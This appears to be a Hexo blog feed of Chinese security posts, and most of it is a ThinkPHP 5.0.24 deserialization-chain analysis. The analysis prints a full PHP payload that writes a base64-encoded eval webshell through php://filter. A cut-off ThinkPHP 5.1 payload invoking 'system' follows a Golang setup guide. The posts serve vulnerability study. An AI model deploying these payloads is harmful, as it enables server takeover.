    <summary type="html">&lt;h2 id=&quot;SSRF利用中的万能协议gopher&quot;&gt;&lt;a href=&quot;#SSRF利用中的万能协议gopher&quot; class=&quot;headerlink&quot; title=&quot;SSRF利用中的万能协议gopher&quot;&gt;&lt;/a&gt;SSRF利用中的万能协议gopher&lt;/h2&gt;&lt;p&gt;在一次CTF</summary>
      
    
    
    
    
    <category term="SSRF" scheme="http://example.com/tags/SSRF/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPhp5.0.x反序列化链分析</title>
    <link href="http://example.com/2021/04/27/ThinkPhp5-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2021/04/27/ThinkPhp5-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/</id>
    <published>2021-04-27T09:41:59.000Z</published>
    <updated>2021-04-29T00:56:39.028Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>之前花了很大的功夫审计了Thinkphp5.1.x的反序列化利用连，对整个反序列化的利用过程和整个代码审计的逻辑，过程都学到了很多，这次继续来分析Thinkphp5.0.X的反序列化利用连比第一次轻松，容易了许多，也学到了不少新的东西，对代码逻辑的理解又更深了。</p><h2 id="复现环境："><a href="#复现环境：" class="headerlink" title="复现环境："></a>复现环境：</h2><p>thinkphp5.0.24，windows10</p><h2 id="0x01-从与5-1不一样的地方开始入手"><a href="#0x01-从与5-1不一样的地方开始入手" class="headerlink" title="0x01:从与5.1不一样的地方开始入手"></a>0x01:从与5.1不一样的地方开始入手</h2><p>因为所用到的知识以及配置的环境都和5.0.24的哪一条链很类似，只不过利用的类，方式不同了，大同小异，所以我们跳过与5.1相似的地方直接从不一样的地方开始分析。</p><p>先放出payload方便分析：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace think\process\pipes;</span><br><span class="line">class Windows</span><br><span class="line">&#123;</span><br><span class="line">    private $files &#x3D; [];</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;files &#x3D; [new \think\model\Merge];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model;</span><br><span class="line">use think\Model;</span><br><span class="line"></span><br><span class="line">class Merge extends Model</span><br><span class="line">&#123;</span><br><span class="line">    protected $append &#x3D; [];</span><br><span class="line">    protected $error;</span><br><span class="line"></span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;append &#x3D; [</span><br><span class="line">            &#39;MENGDA&#39; &#x3D;&gt; &#39;getError&#39;</span><br><span class="line">        ];</span><br><span class="line">        $this-&gt;error &#x3D; (new \think\model\relation\BelongsTo);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think;</span><br><span class="line">class Model&#123;&#125;</span><br><span class="line"></span><br><span class="line">namespace think\console;</span><br><span class="line">class Output</span><br><span class="line">&#123;</span><br><span class="line">    protected $styles &#x3D; [];</span><br><span class="line">    private $handle &#x3D; null;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;styles &#x3D; [&#39;removeWhereField&#39;];</span><br><span class="line">        $this-&gt;handle &#x3D; (new \think\session\driver\Memcache);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model\relation;</span><br><span class="line">class BelongsTo</span><br><span class="line">&#123;</span><br><span class="line">    protected $query;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;query &#x3D; (new \think\console\Output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\session\driver;</span><br><span class="line">class Memcache</span><br><span class="line">&#123;</span><br><span class="line">    protected $handler &#x3D; null;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;handler &#x3D; (new \think\cache\driver\Memcached);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think\cache\driver;</span><br><span class="line">class File</span><br><span class="line">&#123;</span><br><span class="line">    protected $tag;</span><br><span class="line">    protected $options &#x3D; [];</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;tag &#x3D; false;</span><br><span class="line">        $this-&gt;options &#x3D; [</span><br><span class="line">            &#39;expire&#39;        &#x3D;&gt; 3600,</span><br><span class="line">            &#39;cache_subdir&#39;  &#x3D;&gt; false,</span><br><span class="line">            &#39;prefix&#39;        &#x3D;&gt; &#39;&#39;,</span><br><span class="line">            &#39;data_compress&#39; &#x3D;&gt; false,</span><br><span class="line">            &#39;path&#39;          &#x3D;&gt; &#39;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;.&#x2F;&#39;,</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Memcached</span><br><span class="line">&#123;</span><br><span class="line">    protected $tag;</span><br><span class="line">    protected $options &#x3D; [];</span><br><span class="line">    protected $handler &#x3D; null;</span><br><span class="line"></span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;tag &#x3D; true;</span><br><span class="line">        $this-&gt;options &#x3D; [</span><br><span class="line">            &#39;expire&#39;   &#x3D;&gt; 0,</span><br><span class="line">            &#39;prefix&#39;   &#x3D;&gt; &#39;PD9waHAgZXZhbCgkX0dFVFsnbWVuZ2RhJ10pOz8+&#39;,</span><br><span class="line">        ];</span><br><span class="line">        $this-&gt;handler &#x3D; (new File);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo base64_encode(serialize(new \think\process\pipes\Windows()));</span><br></pre></td></tr></table></figure><p>和5.1一样，最初的入口都是Windows类中的destruct魔术方法，然后在file_exists中传入一个实例化对象调用此对象的toString魔术方法。这里就不多说了，不一样的也就从这里开始了。</p><p>在Payload中可以看到windows类中实例化的对象是Merge对象，而我们发现Merge对象是继承自Model对象的，所以直接来到Model类的toArray方法，到此都和5.1的链是一样的，都是进入了Model类的toArray方法，来到toArray方法后就和5.1发生了变化。</p><p>首先我们看到</p><img src="/2021/04/27/ThinkPhp5-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/R3%7DGI26US1Q8587Y%7DR%602RR.png" class title="img"><p>在这$this-&gt;append可控，payload中将值设置为了’MENGDA’ =&gt; ‘getError’，那么在经过第一个foreach后，$key=MENGDA,$name=getError，我们看到第899行代码，进入parseName，此时传入的$name参数为getError，</p><img src="/2021/04/27/ThinkPhp5-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/image-20210428105847337.png" class title="image-20210428105847337"><p>可以看到parseName函数只是进行了一下格式转换，直接返回getError，此时$relation的值为getError，虽后便来到第900行代码，检测当前类中是否存在getError方法，若存在则将$modelRelation的值赋值为$this-&gt;$relation()的返回值，而此时$relation为getError，所以$modelRelation的值为model类中getError方法的返回值，我们看一下这个方法。</p><img src="/2021/04/27/ThinkPhp5-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/image-20210428110202314.png" class title="image-20210428110202314"><p>可以看到，getError直接返回$this-&gt;error，也就是直接返回一个我们可以控制的值。那么到现在$modelRelation的值我们可控了，根据payload可得知，我们将它控制为\think\model\relation\BelongsTo类。</p><p>紧接着我们回到toArray方法来到第902行代码，进入getRelationData()方法，代码如下：</p><img src="/2021/04/27/ThinkPhp5-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/image-20210428111041123.png" class title="image-20210428111041123"><p>可以看到该方法要求传入参数是一个Relation类型的类，这也是为什么我们要将$modelRealtion赋值为\think\model\relation\BelongsTo类，因为BelongsTo继承于OneToOne，</p><img src="/2021/04/27/ThinkPhp5-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/image-20210428111220503.png" class title="image-20210428111220503"><p>而OneToOne又继承于Relation</p><img src="/2021/04/27/ThinkPhp5-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/image-20210428111306724.png" class title="image-20210428111306724"><p>所以满足需求。</p><p>第一个if无法满足条件直接来到else，此时的$modelRelation为BelongsTo，来到BelongsTo类下的getRelation方法，</p><img src="/2021/04/27/ThinkPhp5-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/image-20210428202024409.png" class title="image-20210428202024409"><p>此时的$this-&gt;query的值可控，为\think\console\Output类，而output类中并不存在removeWhereField方法，所以跳转到output类中的call魔术方法中。</p><img src="/2021/04/27/ThinkPhp5-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/image-20210428202215223.png" class title="image-20210428202215223"><p>此处我们可以看到，if条件为$method是否存在于$this-&gt;styles中，而我们不存在的方法就是removeWhereField，所以payload中需要控制$this-&gt;style为removeField满足if条件，进入if可以看到call_user_func_array调用了当前类的block方法，我们的参数传入output类的block方法。来到block方法</p><img src="/2021/04/27/ThinkPhp5-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/image-20210428202737206.png" class title="image-20210428202737206"><p>将两个参数传入，$style为removeWhereField,$message为null，继续跟进来到writeln中，当前参数没有什么用所以不管他</p><img src="/2021/04/27/ThinkPhp5-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/image-20210428203139611.png" class title="image-20210428203139611"><p>继续跟进来到write，我们现在处于Output类中的write方法，$massages是上面block方法中writeln方法所传入的字符串，此时$this-&gt;handle为\think\session\driver\Memcache，跳转到Memcache类中的write方法</p><img src="/2021/04/27/ThinkPhp5-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/image-20210428203245049.png" class title="image-20210428203245049"><p>来到Memcache类中的write方法，此时$this-&gt;handler的值为\think\cache\driver\Memcached，所以跳转到Memcached类的set方法</p><img src="/2021/04/27/ThinkPhp5-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/image-20210428203821914.png" class title="image-20210428203821914"><p>来到Memcached类中的set方法</p><img src="/2021/04/27/ThinkPhp5-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/image-20210428204747464.png" class title="image-20210428204747464"><p>第109行代码进入判断，进入has方法<img src="/D:ThinkPhp5-0-x反序列化链分析/image-20210429081321422.png" alt="image-20210429081321422"></p><p>跟进getCacheKey方法</p><p><img src="/D:ThinkPhp5-0-x反序列化链分析/image-20210429081418204.png" alt="image-20210429081418204"></p><p>可以看到，这里getCacheKey会返回一个$this-&gt;options[‘prefix’]和$name的拼接结果。而此时的getCacheKey是我们通过base64加密过后的危害代码，这个方法在后面会经常用到。紧接着进入下面的get方法，此时的$this-&gt;hanlder为File类，因此我们直接来到File类的get方法</p><p><img src="/D:ThinkPhp5-0-x反序列化链分析/image-20210429081938005.png" alt="image-20210429081938005"></p><p>可以看到$filename为拼接后的字符串，is_file为false，取反为True，直接返回default，然后回到Memached中的set方法，来到下面对$key进行赋值此时再次调用getCacheKey，得到拼接字符串。最后调用File类的set方法，传入的值为$key，$value，$expire。此时仅仅只有$key是我们可控的，其他的无法控制。</p><p>来到file类中的set方法，此时$name就是我们传入的$key</p><p><img src="/D:ThinkPhp5-0-x反序列化链分析/image-20210429082821025.png" alt="image-20210429082821025"></p><p>看到第150行代码，进入getCacheKey中，参数为刚刚拼接过后的字符串($key)。看到第160行代码，这里就是触发文件写入的点，将$data写入$filename，而data在这里我们是不可控的，拼接前的$data存在xeit()，即使我们的$data可控也无法让我们的危害代码执行。这里就绪要通过php伪协议将里面的内容进行加密，加密后exit()就不存在了。我选择的是base64加密，这也是为什么payload中的危害代码是通过base64加密的。</p><p><img src="/D:ThinkPhp5-0-x反序列化链分析/image-20210429082948443.png" alt="image-20210429082948443"></p><p>可以看到首先将$name进行md5加密后进行了拼接。得到filename。这里我们控制$this-&gt;options[‘path’]为php伪协议php://filter/convert.base64-decode/resource=./拼接后的结果为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;.&#x2F;$name.php</span><br></pre></td></tr></table></figure><p>当带着这个调用file_put_contents时会将$data的内容进行base64解密过后写入./$name.php</p><p>第一次文件写入成功，可是我们并没有将危害代码写入目标服务器。怎么办？</p><p>回到Memacached.php中</p><p><img src="/D:ThinkPhp5-0-x反序列化链分析/image-20210429083851991.png" alt="image-20210429083851991"></p><p>在啊调用完第114行代码的set后我们进入了setTagItem方法，该方法会再次调用set函数，那么这次就给了我们可乘之机。</p><p><img src="/D:ThinkPhp5-0-x反序列化链分析/image-20210429084507081.png" alt="image-20210429084507081"></p><p>if条件不满足直接将$name赋值给了$value，再次调用Memached类中的set方法，而此时，$value可控。</p><p><img src="/D:ThinkPhp5-0-x反序列化链分析/image-20210429084733935.png" alt="image-20210429084733935"></p><p>带着$key，$value都可控的数据再次进入File类的set方法</p><p><img src="/D:ThinkPhp5-0-x反序列化链分析/image-20210429084835386.png" alt="image-20210429084835386"></p><p>直接来到file_put_contents处调用。将危害代码写入名字为d8ff72877afda1b924db7a6527e07dd4.php的文件中，而这个d8ff72877afda1b924db7a6527e07dd4是$name的md5值。文件写入完成。第一个8f开头的文件是第一次无法写入危害代码生成的，第二个d8开头的文件是我们可控后第二次写入的。</p><p><img src="/D:ThinkPhp5-0-x反序列化链分析/image-20210429085316343.png" alt="image-20210429085316343"></p><p>测试：</p><p><img src="/D:ThinkPhp5-0-x反序列化链分析/image-20210429085623474.png" alt="image-20210429085623474"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class=&quot;headerlink&quot; title=&quot;前言：&quot;&gt;&lt;/a&gt;前言：&lt;/h2&gt;&lt;p&gt;之前花了很大的功夫审计了Thinkphp5.1.x的反序列化利用连，对整个反序列化的利用过程和整个代码审计的逻辑，过程都学到了很多，</summary>
      
    
    
    
    
    <category term="-Thinkphp5 -源码审计 -漏洞复现 -反序列化" scheme="http://example.com/tags/Thinkphp5-%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Golang-Windows环境配置踩坑(超详细)</title>
    <link href="http://example.com/2021/03/03/Golang-Windows%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E8%B8%A9%E5%9D%91/"/>
    <id>http://example.com/2021/03/03/Golang-Windows%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E8%B8%A9%E5%9D%91/</id>
    <published>2021-03-03T02:46:24.000Z</published>
    <updated>2021-03-03T03:26:29.495Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-下载，安装Go"><a href="#0x01-下载，安装Go" class="headerlink" title="0x01:下载，安装Go"></a>0x01:下载，安装Go</h1><p>访问<a href="https://golang.google.cn/dl/">https://golang.google.cn/dl/</a></p><img src="/2021/03/03/Golang-Windows%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E8%B8%A9%E5%9D%91/image-20210303104923090.png" class title="image-20210303104923090"><p>选择对应版本，一路默认(注意一下安装路径，或者你自己选)，安装即可。</p><h1 id="0X02：配置系统环境变量"><a href="#0X02：配置系统环境变量" class="headerlink" title="0X02：配置系统环境变量"></a>0X02：配置系统环境变量</h1><h4 id="1-配置系统环境变量"><a href="#1-配置系统环境变量" class="headerlink" title="1.配置系统环境变量"></a>1.配置系统环境变量</h4><p>找到我们刚刚安装go的位置，我默认安装在了”C:\Program Files\Go“下，那么”C:\Program Files\Go\bin“就是系统环境变量的值，将它添加到其中即可。</p><img src="/2021/03/03/Golang-Windows%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E8%B8%A9%E5%9D%91/1.png" class width="1"><p>起一下cmd验证一下，配置成功。</p><img src="/2021/03/03/Golang-Windows%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E8%B8%A9%E5%9D%91/image-20210303105724535.png" class title="image-20210303105724535"><h1 id="0X03-建立工作目录，配置GOPATH"><a href="#0X03-建立工作目录，配置GOPATH" class="headerlink" title="0X03:建立工作目录，配置GOPATH"></a>0X03:建立工作目录，配置GOPATH</h1><h4 id="1-GOPATH工程结构"><a href="#1-GOPATH工程结构" class="headerlink" title="1.GOPATH工程结构"></a>1.GOPATH工程结构</h4><p>在 GOPATH 指定的工作目录下，代码总是会保存在 $GOPATH/src 目录下。在工程经过 go build、go install 或 go get 等指令后，会将产生的二进制可执行文件放在 $GOPATH/bin 目录下，生成的中间缓存文件会被保存在 $GOPATH/pkg 下。</p><p>这里的$GOPATH指的便是我们的工作路径。举个例子</p><p>现在，我需要在D盘建立一个文件夹用来存放我的go代码文件，我会现在D盘下新建一个名字叫“go”文件夹，那么这个时候$GOPATH=D:\go，我们在D:\go下面创建三个文件夹，src,bin,pkg。然后将我们的代码放到src文件中来管理我们的代码文件如</p><p>“src\hello\hello.go”</p><h4 id="2-配置GOPATH环境变量"><a href="#2-配置GOPATH环境变量" class="headerlink" title="2.配置GOPATH环境变量"></a>2.配置GOPATH环境变量</h4><p>前面我们已经说过$GOPATH的值便是你项目目录的地址，我们将其添加到环境变量即可</p><img src="/2021/03/03/Golang-Windows%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E8%B8%A9%E5%9D%91/2.png" class width="2"><h1 id="0X04-配置VSCODE"><a href="#0X04-配置VSCODE" class="headerlink" title="0X04:配置VSCODE"></a>0X04:配置VSCODE</h1><p>首先在VSCODE中安装go依赖就不说了</p><img src="/2021/03/03/Golang-Windows%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E8%B8%A9%E5%9D%91/image-20210303111235640.png" class title="image-20210303111235640"><p>然后当我们开开心心的运行第一个程序的时候会提示我们安装各种go组件,我这里没图了，当你运行的时候会在右下角弹出来，点击InstallAll</p><p>但是因为各种原因，百分之99是安装失败的。网上各种垃圾复制文章也不能起到任何的作用，基本上都是通过自己下载备份手动安装，但是这里我们可以通过Go自带的全球模块代理，设置代理后安装插件就OK了。</p><p>win10打开powershell</p><p>依次键入(注意，你直接复制后到powershell直接右键时会报错的，因为”on”的双引号会被去掉，记得手动加上)</p><p>$env:GO111MODULE=“on”</p><p>$env:GOPROXY=“<a href="https://goproxy.io”/">https://goproxy.io”</a></p><p>go env -w GOPROXY=<a href="https://goproxy.io,direct/">https://goproxy.io,direct</a></p><p>go env -w GOPRIVATE=*.corp.example.com</p><p>当你运行到go env -w GOPROXY=<a href="https://goproxy.io,direct很可能会出现警告“warning/">https://goproxy.io,direct很可能会出现警告“warning</a>: go env -w GOPROXY=… does not override conflicting OS environm”，但是在我的环境上出现此警告并没有对vscode安装插件出现影响。</p><p>一切安装完毕后运行时又有可能出现报错</p><img src="/2021/03/03/Golang-Windows%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E8%B8%A9%E5%9D%91/001.png" class width="001"><p>出现该报错打开launch.json，复制以下代码即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F; 使用 IntelliSense 了解相关属性。 </span><br><span class="line">    &#x2F;&#x2F; 悬停以查看现有属性的描述。</span><br><span class="line">    &#x2F;&#x2F; 欲了解更多信息，请访问: https:&#x2F;&#x2F;go.microsoft.com&#x2F;fwlink&#x2F;?linkid&#x3D;830387</span><br><span class="line">    &quot;version&quot;: &quot;0.2.0&quot;,</span><br><span class="line">    &quot;configurations&quot;: [</span><br><span class="line">        </span><br><span class="line">        &#123;</span><br><span class="line">            &quot;name&quot;: &quot;Launch&quot;,</span><br><span class="line">            &quot;type&quot;: &quot;go&quot;,</span><br><span class="line">            &quot;request&quot;: &quot;launch&quot;,</span><br><span class="line">            &quot;mode&quot;: &quot;auto&quot;,</span><br><span class="line">            &quot;remotePath&quot;: &quot;&quot;,</span><br><span class="line">            &quot;port&quot;: 2345,</span><br><span class="line">            &quot;host&quot;: &quot;127.0.0.1&quot;,</span><br><span class="line">            &quot;program&quot;: &quot;$&#123;fileDirname&#125;&quot;,</span><br><span class="line">            &quot;env&quot;: &#123;</span><br><span class="line">                    &quot;GO111MODULE&quot;: &quot;off&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;args&quot;: [],</span><br><span class="line">            &quot;showLog&quot;: false</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此，全部问题解决完毕。运行，Hello，Go！</p><img src="/2021/03/03/Golang-Windows%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E8%B8%A9%E5%9D%91/image-20210303112404893.png" class title="image-20210303112404893">]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-下载，安装Go&quot;&gt;&lt;a href=&quot;#0x01-下载，安装Go&quot; class=&quot;headerlink&quot; title=&quot;0x01:下载，安装Go&quot;&gt;&lt;/a&gt;0x01:下载，安装Go&lt;/h1&gt;&lt;p&gt;访问&lt;a href=&quot;https://golang.goog</summary>
      
    
    
    
    
    <category term="-Golang" scheme="http://example.com/tags/Golang/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPhp5.1.x反序列化漏洞分析利用</title>
    <link href="http://example.com/2021/03/02/ThinkPhp5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8/"/>
    <id>http://example.com/2021/03/02/ThinkPhp5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8/</id>
    <published>2021-03-02T06:49:33.000Z</published>
    <updated>2021-04-12T18:25:28.015Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>最近开始审计thinkphp的一些漏洞，理解其原理，加深对框架工作模式的认知。由于在CTF中了解一些反序列化的基本知识以及基本原理，但是没有分析过一条真正意义上的反序列化链，这次直接上手thinkphp的反序列化链开头也比较困难，不过在用了差不多一周的时间反反复复研究也差不多看懂了这条链，在学习网上大师父们的思路后自己也有了一些新的理解，遂记录。</p><h2 id="复现环境："><a href="#复现环境：" class="headerlink" title="复现环境："></a>复现环境：</h2><p>thinkphp5.1.37，windows10</p><h2 id="0X01-基础配置"><a href="#0X01-基础配置" class="headerlink" title="0X01:基础配置"></a>0X01:基础配置</h2><p>总所周知反序列化漏洞的触发的基础来自于php自带的魔法函数，这一类函数他们非常具有特点。特点就在于当对象被执行特定操作时就会触发。在本次pop链中使用到的魔法函数有</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__construct()在对象被实例化时调用</span><br><span class="line">__destruct()在对象被销毁时调用</span><br><span class="line">__toString()在对象被当作字符串处理的时候调用</span><br><span class="line">__call()在调用对象不存在的方法的时候调用</span><br></pre></td></tr></table></figure><p>要开始pop链的分析，必须要添加一个入口，unserialize()函数会将我们的序列化数据还原，从而开始pop链的执行。我在index模块的index控制器下增加了如下代码</p><img src="/2021/03/02/ThinkPhp5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8/image-20210410155655869.png" class title="image-20210410155655869"><p>用一个payload参数来接收我们的序列化数据，这里将payload先加密在解密的原因是因为直接传输需要进行url编码，这样处理后就不用url编码了，很方便。</p><p>至此，我们打通了一个能够进行反序列化的通道，开始pop链的分析之旅</p><h2 id="0X02-入口"><a href="#0X02-入口" class="headerlink" title="0X02:入口"></a>0X02:入口</h2><h4 id="Payload："><a href="#Payload：" class="headerlink" title="Payload："></a>Payload：</h4><p>为了更方便我们进行整个链的分析，我将payload先放出来，以方便观察利用链中的可控参数变化。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace think;</span><br><span class="line">abstract class Model&#123;</span><br><span class="line">    protected $append &#x3D; [];</span><br><span class="line">    private $data &#x3D; [];</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;append &#x3D; [&quot;Mengd@&quot;&#x3D;&gt;[&#39;bcc&#39;, &#39;bcc&#39;]];</span><br><span class="line">        $this-&gt;data &#x3D; [&quot;Mengd@&quot;&#x3D;&gt;new Request()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Request</span><br><span class="line">&#123;</span><br><span class="line">    protected $hook &#x3D; [];</span><br><span class="line">    protected $filter &#x3D; &quot;&quot;;</span><br><span class="line">    protected $config &#x3D; [];</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;filter &#x3D; &quot;system&quot;;</span><br><span class="line">        $this-&gt;config &#x3D; 